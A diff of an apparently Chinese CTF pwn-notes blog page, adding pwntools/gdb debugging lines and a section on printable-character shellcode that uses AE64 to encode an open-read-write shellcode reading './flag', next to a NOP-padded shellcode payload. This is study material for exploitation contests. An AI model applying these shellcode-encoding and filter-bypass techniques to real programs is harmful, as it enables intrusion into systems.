@@ -322,7 +322,7 @@
 
 
                 <time class="article-words">
-                    38322 字
+                    38451 字
                 </time>
             </div>
         
@@ -923,14 +923,18 @@
 </span><span class="lnt">33
 </span><span class="lnt">34
 </span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;split-w&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>	
 </span></span><span class="line"><span class="cl"><span class="c1">#需要保证tmux已经运行</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./xxx&#34;</span><span class="p">)</span> <span class="c1"># pid xxxx</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&#34;./xxx&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;ip&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># p64(8)： 0x0000000000000008</span>
@@ -1197,6 +1201,9 @@
 </span><span class="lnt">82
 </span><span class="lnt">83
 </span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="c1">#exp调试时下断点在malloc函数</span>
@@ -1283,6 +1290,9 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">#求偏移</span>
 </span></span><span class="line"><span class="cl"><span class="n">distance</span> <span class="n">address1</span> <span class="n">address2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span> <span class="c1"># 查看命令</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>查看栈中的时候出现<code>0xffff → 0xfffc ← 'aaa'</code>表示<code>0xffff</code>地址处存放着一个指针，指针指向<code>'aaa'</code></strong></p>
@@ -3159,6 +3169,44 @@
 </span></span><span class="line"><span class="cl"><span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="c1"># 第二次读需要重新覆盖前面0x10地址</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pay</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;/flag</span><span class="se">\x00\x00\x00</span><span class="s1">&#39;</span> 
 </span></span><span class="line"><span class="cl"><span class="c1"># 可能需要gdb微调在前后加\x00或\x90使刚好对应地址读取flag而不是flagxx</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>可见字符Shellcode</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">31</span> <span class="o">||</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">127</span> <span class="p">)</span> <span class="c1">// 进允许输入可见字符的Shellcode
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用工具<strong>AE64</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ae64</span> <span class="kn">import</span> <span class="n">AE64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">shellcraft</span> <span class="c1"># 使用ORW</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;./flag&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x20240000</span><span class="p">,</span><span class="mi">30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x20240000</span><span class="p">,</span><span class="mi">30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ss</span> <span class="o">=</span> <span class="n">AE64</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span><span class="s1">&#39;rdx&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;fast&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># arg: shellcode, 寄存器: call rdx, 偏移, 策略:fast or small</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ss</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="rop">ROP</h2>
@@ -6792,7 +6840,7 @@
         
             
         
-        共 98.48k 字 · 共 16篇文章
+        共 101.95k 字 · 共 16篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
